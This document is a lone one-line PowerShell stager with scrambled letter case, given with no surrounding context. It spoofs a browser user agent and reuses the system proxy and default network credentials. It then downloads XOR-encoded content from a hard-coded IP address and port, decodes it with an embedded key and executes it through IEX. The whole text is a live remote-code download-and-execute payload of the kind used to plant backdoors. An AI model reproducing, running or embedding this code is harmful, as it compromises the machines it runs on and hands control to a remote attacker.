
[SYsteM.NET.ServicePOINtMAnaGEr]::ExPEct100CoNtInue = 0;$WC=New-ObJEct SySTem.NeT.WEBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEADERS.ADd('User-Agent',$u);$Wc.PrOXy = [SySTEm.NeT.WeBReQueSt]::DEfaULtWEbProxY;$wC.ProXy.CREdENTIALs = [SYsTEm.Net.CREdentiaLCache]::DEfauLtNEtwoRkCREdEntiAlS;$K='63a9f0ea7bb98050796b649e85481845';$i=0;[cHAR[]]$b=([CHaR[]]($wc.DownLoAdStRING("http://138.121.170.12:3137/index.asp")))|%{$_-BXOr$K[$i++%$k.Length]};IEX ($B-JoIN'')

